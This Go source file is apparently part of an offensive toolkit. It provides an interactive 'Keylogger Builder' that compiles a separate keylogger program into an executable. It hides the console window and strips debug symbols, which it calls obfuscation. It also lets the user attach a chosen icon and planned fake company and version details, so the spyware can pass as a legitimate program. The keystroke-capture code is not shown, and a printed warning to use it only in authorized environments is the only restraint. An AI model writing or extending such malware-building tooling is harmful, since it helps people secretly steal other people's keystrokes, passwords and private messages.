package keylogger

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"programa/utils"
)

func LaunchKeylogger() {
	for {
		utils.ClearTerminal()
		showKeyloggerMenu()

		reader := bufio.NewReader(os.Stdin)
		fmt.Printf("%sChoose an option: %s", utils.Green, utils.Reset)
		input, readErr := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		if readErr != nil && input == "" {
			return
		}

		switch input {
		case "1":
			buildKeylogger()
		case "2":
			return
		default:
			fmt.Printf("%sInvalid option!%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
		}
	}
}

func showKeyloggerMenu() {
	fmt.Printf("\n%s╔═══════════════════════════════════════════════════════════════╗%s\n", utils.Purple, utils.Reset)
	fmt.Printf("%s║              KEYLOGGER BUILDER                                ║%s\n", utils.Purple, utils.Reset)
	fmt.Printf("%s╚═══════════════════════════════════════════════════════════════╝%s\n\n", utils.Purple, utils.Reset)

	fmt.Printf("%s  [1] Build Keylogger%s\n", utils.Red, utils.Reset)
	utils.PrintReturnOption("2")
}

func buildKeylogger() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ BUILD KEYLOGGER ═══%s\n\n", utils.Red, utils.Reset)

	reader := bufio.NewReader(os.Stdin)

	fmt.Printf("%sOutput filename (default: logger.exe): %s", utils.Green, utils.Reset)
	filename, _ := reader.ReadString('\n')
	filename = strings.TrimSpace(filename)
	if filename == "" {
		filename = "logger.exe"
	}
	if !strings.HasSuffix(filename, ".exe") && runtime.GOOS == "windows" {
		filename += ".exe"
	}

	fmt.Printf("\n%sSelect icon (optional):%s\n", utils.Yellow, utils.Reset)
	icon := selectIconForKeylogger()

	fmt.Printf("\n%sObfuscate code? (y/n): %s", utils.Yellow, utils.Reset)
	obfuscate, _ := reader.ReadString('\n')
	obfuscate = strings.ToLower(strings.TrimSpace(obfuscate))

	fmt.Printf("\n%sEmbed file information? (y/n): %s", utils.Yellow, utils.Reset)
	embedInfo, _ := reader.ReadString('\n')
	embedInfo = strings.ToLower(strings.TrimSpace(embedInfo))

	var fileDescription, companyName, productVersion string
	if embedInfo == "y" || embedInfo == "yes" {
		fmt.Printf("%sFile Description: %s", utils.Green, utils.Reset)
		fileDescription, _ = reader.ReadString('\n')
		fileDescription = strings.TrimSpace(fileDescription)

		fmt.Printf("%sCompany Name: %s", utils.Green, utils.Reset)
		companyName, _ = reader.ReadString('\n')
		companyName = strings.TrimSpace(companyName)

		fmt.Printf("%sProduct Version: %s", utils.Green, utils.Reset)
		productVersion, _ = reader.ReadString('\n')
		productVersion = strings.TrimSpace(productVersion)
	}

	fmt.Printf("\n%s[*] Building keylogger...%s\n", utils.Yellow, utils.Reset)

	buildArgs := []string{"build"}

	if runtime.GOOS == "windows" {
		buildArgs = append(buildArgs, "-ldflags", "-H=windowsgui")
	}

	buildArgs = append(buildArgs, "-o", filename)

	if obfuscate == "y" || obfuscate == "yes" {
		fmt.Printf("%s[*] Obfuscating code...%s\n", utils.Yellow, utils.Reset)
		buildArgs = append(buildArgs, "-trimpath", "-ldflags", "-s -w")
	}

	buildArgs = append(buildArgs, "logger.go")

	cmd := exec.Command("go", buildArgs...)
	output, err := cmd.CombinedOutput()

	if err != nil {
		fmt.Printf("%s[!] Build failed:%s\n%s\n", utils.Red, utils.Reset, string(output))
		utils.PauseForInput()
		return
	}

	if icon != "" && runtime.GOOS == "windows" {
		fmt.Printf("%s[*] Applying icon...%s\n", utils.Yellow, utils.Reset)
		applyIconToKeylogger(filename, icon)
	}

	if embedInfo == "y" || embedInfo == "yes" {
		fmt.Printf("%s[*] Embedding file information...%s\n", utils.Yellow, utils.Reset)
		embedFileInfoKeylogger(filename, fileDescription, companyName, productVersion)
	}

	fmt.Printf("\n%s[✓] Keylogger built successfully: %s%s\n", utils.Green, filename, utils.Reset)
	fmt.Printf("%s[!] WARNING: Use only in authorized environments!%s\n", utils.Red, utils.Reset)
	utils.PauseForInput()
}

func selectIconForKeylogger() string {
	imgPath := "./images/"

	if _, err := os.Stat(imgPath); os.IsNotExist(err) {
		os.Mkdir(imgPath, 0755)
		fmt.Printf("%s[!] No images folder found. Place icons in ./images/%s\n", utils.Yellow, utils.Reset)
		utils.PauseForInput()
		return ""
	}

	files, err := os.ReadDir(imgPath)
	if err != nil || len(files) == 0 {
		fmt.Printf("%s[!] No icon files found%s\n", utils.Yellow, utils.Reset)
		utils.PauseForInput()
		return ""
	}

	var icons []string
	for _, file := range files {
		if !file.IsDir() {
			ext := strings.ToLower(filepath.Ext(file.Name()))
			if ext == ".ico" || ext == ".png" || ext == ".jpg" || ext == ".jpeg" || ext == ".bmp" {
				icons = append(icons, file.Name())
			}
		}
	}

	if len(icons) == 0 {
		fmt.Printf("%s[!] No image files found%s\n", utils.Yellow, utils.Reset)
		utils.PauseForInput()
		return ""
	}

	fmt.Printf("\n%sAvailable icons:%s\n", utils.Blue, utils.Reset)
	for i, icon := range icons {
		fmt.Printf("%s  [%d] %s%s\n", utils.Green, i+1, icon, utils.Reset)
	}
	fmt.Printf("%s  [0] Skip icon%s\n", utils.Yellow, utils.Reset)

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("\n%sSelect icon number: %s", utils.Green, utils.Reset)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	if input == "0" || input == "" {
		return ""
	}

	var choice int
	fmt.Sscanf(input, "%d", &choice)

	if choice < 1 || choice > len(icons) {
		fmt.Printf("%s[!] Invalid choice%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return ""
	}

	return filepath.Join(imgPath, icons[choice-1])
}

func applyIconToKeylogger(_, iconPath string) {
	if runtime.GOOS != "windows" {
		fmt.Printf("%s[!] Icon embedding only supported on Windows%s\n", utils.Yellow, utils.Reset)
		return
	}

	ext := strings.ToLower(filepath.Ext(iconPath))
	icoPath := iconPath

	if ext != ".ico" {
		fmt.Printf("%s[*] Converting %s to .ico...%s\n", utils.Yellow, ext, utils.Reset)
		icoPath = strings.TrimSuffix(iconPath, ext) + ".ico"

		cmd := exec.Command("magick", "convert", iconPath, "-resize", "256x256", icoPath)
		err := cmd.Run()
		if err != nil {
			fmt.Printf("%s[!] ImageMagick not found. Install or use .ico file.%s\n", utils.Yellow, utils.Reset)
			return
		}
	}

	sysoFile := "rsrc.syso"
	cmd := exec.Command("rsrc", "-ico", icoPath, "-o", sysoFile)
	err := cmd.Run()

	if err != nil {
		fmt.Printf("%s[!] rsrc tool not found. Install: go install github.com/akavel/rsrc@latest%s\n", utils.Yellow, utils.Reset)
		return
	}

	defer os.Remove(sysoFile)

	fmt.Printf("%s[✓] Icon embedded%s\n", utils.Green, utils.Reset)
}

func embedFileInfoKeylogger(_, _, _, _ string) {
	if runtime.GOOS != "windows" {
		fmt.Printf("%s[!] File info embedding only supported on Windows%s\n", utils.Yellow, utils.Reset)
		return
	}

	fmt.Printf("%s[*] File info would be embedded here (requires additional tools)%s\n", utils.Yellow, utils.Reset)
}
